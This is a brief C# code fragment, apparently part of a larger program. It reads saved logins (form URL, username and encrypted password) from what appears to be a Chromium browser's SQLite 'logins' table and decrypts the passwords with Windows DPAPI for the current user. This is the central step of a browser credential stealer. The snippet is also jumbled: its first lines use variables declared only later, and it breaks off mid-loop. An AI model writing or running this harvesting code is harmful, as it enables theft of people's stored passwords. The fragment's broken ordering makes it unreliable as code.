byte[] decryptedBytes = ProtectedData.Unprotect(password, null, DataProtectionScope.CurrentUser);
string decryptedPasswordString = Encoding.ASCII.GetString(decryptedBytes);
SQLiteCommand sqliteCommand = sqliteConnection.CreateCommand();
sqliteCommand.CommandText = "SELECT action_url, username_value, password_value FROM logins";
SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader();

while (sqliteDataReader.Read())
{
    string formSubmitUrl = sqliteDataReader.GetString(0);

    if (string.IsNullOrEmpty(formSubmitUrl))
    {
        continue;
    }

    string username = sqliteDataReader.GetString(1);
    byte[] password = (byte[])sqliteDataReader[2]; //Cast to byteArray for DPAPI decryption
   
...
